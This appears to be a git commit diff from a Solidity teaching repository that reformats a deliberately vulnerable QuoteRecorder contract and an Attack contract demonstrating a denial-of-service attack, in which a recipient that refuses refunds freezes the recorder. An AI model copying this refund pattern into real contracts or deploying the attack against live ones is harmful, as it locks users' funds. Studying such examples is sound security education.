8887ba1660cba65c5df0160ea3e5b44421424843
hadi <hadi.mohammad.saleh1@gmail.com>
2021-10-24 15:25:09 +0300

    fixes

--- DOS hack/changing state based on external calls/Attack.sol
+++ DOS hack/changing state based on external calls/Attack.sol
@@ -1,14 +1,25 @@
 //SPDX-License-Identifier: MIT
 pragma solidity >=0.7.0 <0.9.0;
-import "QuoteRecorder.sol";
-contract Attack{
-    
-    function attack(QuoteRecorder _quoteRecorder) public {
-        _quoteRecorder.record{value : msg.value}("Be careful of DOS hacks");
+import "./QuoteRecorder.sol";
+
+contract Attack {
+    function attack(QuoteRecorder _quoteRecorder) public payable {
+        _quoteRecorder.record{value: msg.value}("Be careful of DOS hacks");
     }
-    
+
     function getQuoteRecorderBalance(QuoteRecorder _quoteRecorder)
-    public view returns(uint){
+        public
+        view
+        returns (uint256)
+    {
         return _quoteRecorder.balance();
+    }
+
+    function destroy(address payable addr) public {
+        selfdestruct(addr);
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
--- DOS hack/changing state based on external calls/QuoteRecorder.sol
+++ DOS hack/changing state based on external calls/QuoteRecorder.sol
@@ -3,18 +3,16 @@
 pragma solidity >=0.7.0 <0.9.0;
 
 contract QuoteRecorder {
+    address payable public currentQuoteLover;
+    uint256 public balance;
+    string public currentQuote;
 
-   address payable currentQuoteLover;
-   uint public balance;
-   string public currentQuote;
-   
-   function record (string memory quote) external payable{
-       require (msg.value > balance);
-       currentQuoteLover.transfer{value : balance}();
-       balance = msg.value;
-       currentQuoteLover = msg.sender;
-       currentQuote = quote;
-   }
-   
-   
+    function record(string memory quote) external payable {
+        require(msg.value > balance);
+        (bool sent, ) = currentQuoteLover.call{value: balance}("");
+        require(sent);
+        balance = msg.value;
+        currentQuoteLover = payable(msg.sender);
+        currentQuote = quote;
+    }
 }
